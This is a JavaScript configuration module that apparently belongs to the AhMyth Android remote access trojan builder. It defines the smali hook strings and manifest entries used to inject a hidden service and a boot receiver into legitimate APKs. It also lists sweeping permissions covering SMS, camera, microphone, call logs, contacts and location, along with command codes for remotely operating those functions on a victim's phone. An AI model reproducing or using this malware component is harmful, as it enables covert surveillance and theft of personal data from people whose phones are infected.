var path = require("path");


//---------------------App Controller Vars----------------------------------
exports.apkName = 'Ahmyth.apk';
exports.apkSourceName = 'Ahmyth';
exports.signedApkName = 'Ahmyth-aligned-debugSigned.apk';
exports.ahmythApkFolderPath = path.join(__dirname, '..', '..', 'Factory/Ahmyth').replace("app.asar", "app.asar.unpacked");
exports.vaultFolderPath = path.join(__dirname, '..', '..', 'Factory/Vault').replace("app.asar", "app.asar.unpacked");
exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");
exports.maskUrlPython = path.join(__dirname, '..', '..', 'Factory/maskUrl.py').replace("app.asar", "app.asar.unpacked");
exports.dataDir = 'AhMyth'
exports.downloadPath = 'Downloads';
exports.outputApkPath = 'Output';
exports.outputLogsPath = 'Logs';
exports.logColors = { RED: "red",  GREEN: "lime", YELLOW: "yellow", DEFAULT: "#82eefd" };
exports.logStatus = { SUCCESS: 1, FAIL: 0, INFO: 2 };
exports.defaultPort = 42474;
exports.IOSocketPath = 'smali/ahmyth/mine/king/ahmyth/e.smali';
exports.ahmythService = '<service android:enabled="true" android:exported="false" android:name="ahmyth.mine.king.ahmyth.MainService"/>';
exports.ahmythReciver = '<receiver android:enabled="true" android:exported="true" android:name="ahmyth.mine.king.ahmyth.MyReceiver">' +
    '<intent-filter>' +
    '<action android:name="android.intent.action.BOOT_COMPLETED"/>' +
    '</intent-filter>' +
    '</receiver>';
exports.serviceSrc = 'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService'
exports.serviceStart = ';->start()V \n\n' +
'    return-void';
exports.hookPoint = 'return-void';
exports.permissions = [
    '<uses-permission android:name="android.permission.WAKE_LOCK"/>',
    '<uses-permission android:name="android.permission.CAMERA"/>',
    '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>',
    '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
    '<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>',
    '<uses-permission android:name="android.permission.WRITE_SETTINGS"/>',
    '<uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>',
    '<uses-permission android:name="android.permission.INTERNET"/>',
    '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
    '<uses-permission android:name="android.permission.READ_SMS"/>',
    '<uses-permission android:name="android.permission.SEND_SMS"/>',
    '<uses-permission android:name="android.permission.RECEIVE_SMS"/>',
    '<uses-permission android:name="android.permission.WRITE_SMS"/>',
    '<uses-feature android:name="android.hardware.camera"/>',
    '<uses-feature android:name="android.hardware.camera.autofocus"/>',
    '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>',
    '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
    '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
    '<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>',
    '<uses-permission android:name="android.permission.READ_CONTACTS"/>',
    '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
    '<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>',
    '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
    '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
    '<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>',
    '<uses-permission android:name="android.permission.INSTALL_PACKAGE"/>'
]



//---------------------Lab Controller Vars----------------------------------
exports.order = 'order';
exports.orders = {
    camera: 'x0000ca',
    fileManager: 'x0000fm',
    calls: 'x0000cl',
    sms: 'x0000sm',
    mic: 'x0000mc',
    location: 'x0000lm',
    contacts: 'x0000cn',

}
